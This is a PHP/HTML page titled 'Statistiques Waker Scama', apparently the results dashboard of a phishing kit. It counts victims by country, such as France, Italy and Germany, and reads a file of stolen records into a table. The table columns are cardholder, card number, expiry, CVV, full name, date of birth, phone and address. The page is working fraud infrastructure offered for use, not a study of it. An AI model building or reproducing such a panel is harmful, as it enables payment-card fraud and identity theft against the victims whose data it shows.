<!doctype html>
<html lang="en">
  <head>
  	<title>Statistiques Waker Scama</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

	<link href='https://fonts.googleapis.com/css?family=Roboto:400,100,300,700' rel='stylesheet' type='text/css'>

	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
	
	<link rel="stylesheet" href="css/style.css">

	</head>
	<body>
	<section class="ftco-section">
		<div class="container">
			<div class="row justify-content-center">
				<div class="col-md-6 text-center mb-5">
					<h2 class="heading-section">Pays touchés</h2>
				</div>
			</div>
			<div class="row">
				<div class="col-md-12">
					<div class="table-wrap">
						<table class="table table-responsive-xl">
						  <thead>
						    <tr>
						      <th>France</th>
						      <th>Italie</th>
						      <th>Allemange</th>
						      <th>Brézil</th>
						      <th>Norvège</th>
							  <th>Dubai</th>
						    </tr>
						  </thead>
						  <tbody>
							<?php
								$json = json_decode(file_get_contents('../server/stats.json'),true)['country'];		
							?>
						    <tr class="alert" role="alert">
						      <td class="status"><?php echo $json['fr'] ?></td>
						      <td class="status"><?php echo $json['it'] ?></td>
						      <td class="status"><?php echo $json['de'] ?></td>
							  <td class="status"><?php echo $json['brz'] ?></td>
							  <td class="status"><?php echo $json['nrw'] ?></td>
							  <td class="status"><?php echo $json['aeu'] ?></td>
						    </tr>
						   
						  </tbody>
						</table>
					</div>
				</div>
			</div>
			<div class="row justify-content-center">
				<div class="col-md-6 text-center mb-5">
					<h2 class="heading-section">Résultats</h2>
				</div>
			</div>
			<div class="row">
				<div class="col-md-12">
					<div class="table-wrap">
						<table class="table table-responsive-xl">
						  <thead>
						    <tr>
						      <th>Titulaire</th>
						      <th>Numéro de carte</th>
						      <th>EXP</th>
						      <th>CCV</th>
						      <th>Nom & Prénom</th>
							  <th>Date de naissance</th>
							  <th>Téléphone</th>
							  <th>Ville</th>
							  <th>Adresse</th>
							  <th>Code Postal</th>
							  <th>Date d'ajout</th>
						    </tr>
						  </thead>
						  <tbody>
				
						     <?php
                $handle = fopen("../app/rez.txt", "r");
                if ($handle) {
                    while (($line = fgets($handle)) !== false) {
                        $data = explode('|',$line);
                        ?>
                        <tr class="responsive-table__row">
                            <td><?php echo $data[0];?></td>
							<td><?php echo $data[1];?></td>
							<td><?php echo $data[2];?></td>
							<td><?php echo $data[3];?></td>
							<td><?php echo $data[4];?></td>
							<td><?php echo $data[5];?></td>
							<td><?php echo $data[6];?></td>
							<td><?php echo $data[7];?></td>    
							<td><?php echo $data[8];?></td>
							<td><?php echo $data[9];?></td>    
							<td><?php echo $data[10];?></td>   
                        </tr>
                        <?php
                    }
                    fclose($handle);
                }
            ?>
						   
						  </tbody>
						</table>
					</div>
				</div>
			</div>
		</div>
	</section>

	<script src="js/jquery.min.js"></script>
  <script src="js/popper.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="js/main.js"></script>

	</body>
</html>

